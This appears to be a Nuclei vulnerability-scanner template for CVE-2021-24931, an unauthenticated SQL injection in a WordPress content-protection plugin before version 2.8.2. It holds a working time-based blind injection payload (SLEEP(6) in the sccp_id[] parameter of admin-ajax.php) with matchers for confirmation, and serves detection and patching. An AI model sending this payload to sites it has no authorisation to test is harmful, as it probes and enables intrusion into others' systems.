id: CVE-2021-24931
info:
  name: WordPress Secure Copy Content Protection and Content Locking <2.8.2 - SQL
    Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Secure Copy Content Protection and Content Locking plugin
    before version 2.8.2 contains a SQL injection vulnerability that can allow attackers
    to obtain sensitive information, modify data, and execute unauthorized administrative
    operations.
  reference:
  - https://wpscan.com/vulnerability/1cd52d61-af75-43ed-9b99-b46c471c4231
  - https://wordpress.org/plugins/secure-copy-content-protection/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24931
  remediation: Fixed in version 2.8.2.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24931
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in the WordPress Secure Copy Content Protection
      and Content Locking plugin before 2.8.2 can lead to the compromise of sensitive
      information and unauthorized administrative operations on the affected site.
    recommendation: We recommend updating the WordPress Secure Copy Content Protection
      and Content Locking plugin to version 2.8.2 or higher to mitigate the SQL injection
      vulnerability and prevent potential unauthorized access to sensitive information
      or administrative operations.
  tags: wp-plugin,unauth,wpscan,cve2021,sqli,wordpress,cve,wp,secure-copy-content-protection
requests:
- raw:
  - '@timeout: 20s

    GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json
    HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "{\"status\":true")
    condition: and
